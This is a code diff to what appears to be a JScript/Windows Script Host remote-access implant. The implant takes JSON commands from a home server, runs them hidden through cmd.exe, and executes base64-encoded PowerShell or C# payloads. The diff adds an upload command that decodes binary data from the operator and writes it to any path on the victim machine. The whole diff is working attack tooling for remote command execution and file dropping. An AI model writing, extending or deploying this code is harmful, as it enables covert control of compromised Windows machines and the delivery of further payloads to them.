@@ -57,6 +57,15 @@ function post(home, response) {
   return res;
 }
 
+function writebinfile(filename, content) {
+        var stream = new ActiveXObject("ADODB.Stream")
+        stream.Open()
+        stream.Type = 1 //adTypeBinary
+        stream.Write(content)
+        stream.SaveToFile(filename)
+        stream.Close()
+}
+
 function readbinfile(filename) {
 	var stream = new ActiveXObject("ADODB.Stream")
 	stream.Open()
@@ -100,12 +109,18 @@ function bin2str(data) {
   istream.CharSet = "us-ascii"
   return istream.ReadText()
 }
-function b64d(data) {
+
+function b64d(data, type) {
   var xml = new ActiveXObject("MSXml2.DOMDocument");
   var element = xml.createElement("Base64Data");
   element.dataType = "bin.base64"
   element.text = data
-  return bin2str(element.nodeTypedValue)
+  if(type == "bin") {
+    return element.nodeTypedValue
+  }
+  else {
+    return bin2str(element.nodeTypedValue)
+  }
 }
 
 function main()
@@ -137,7 +152,7 @@ function main()
       else if((jsObject.cmnd.split(" ")[0] == "psh") || (jsObject.cmnd.split(" ")[0] == "cs")) {
         fd = fso.CreateTextFile(temp + "\\" + id + ".txt")
         msb = jsObject.cmnd.split(" ")[1]
-        msbdata = b64d(jsObject.cmnd.split(" ")[2])
+        msbdata = b64d(jsObject.cmnd.split(" ")[2], "txt")
         fd.WriteLine(msbdata)
         fd.close()
         runner.Run(cs +" /q /c " + msb + " " + temp + "\\" + id + ".txt" + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
@@ -168,7 +183,22 @@ function main()
 		}
 	  }
 
-	    //credit to nate and 0sum <3
+                else if(jsObject.cmnd.split(" ")[0] == "up") {
+                  try {
+                    var array = jsObject.cmnd.split(" ")
+                    content = b64d(array[1], "bin")
+                    array.shift()
+                    array.shift()
+                    filename = array.join(" ")
+                    writebinfile(filename, content)
+                    retval = "[*] File uploaded: " + filename
+                  }
+                  catch (e) {
+                    retval = "[-] Could not upload file: " + filename
+                  }
+                }
+
+	    //credit to nate and 0sum
 	    else {
         runner.Run(cs +" /q /c " + jsObject.cmnd + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
 		    if(fso.FileExists(temp + "\\__" + id + ".txt")) {
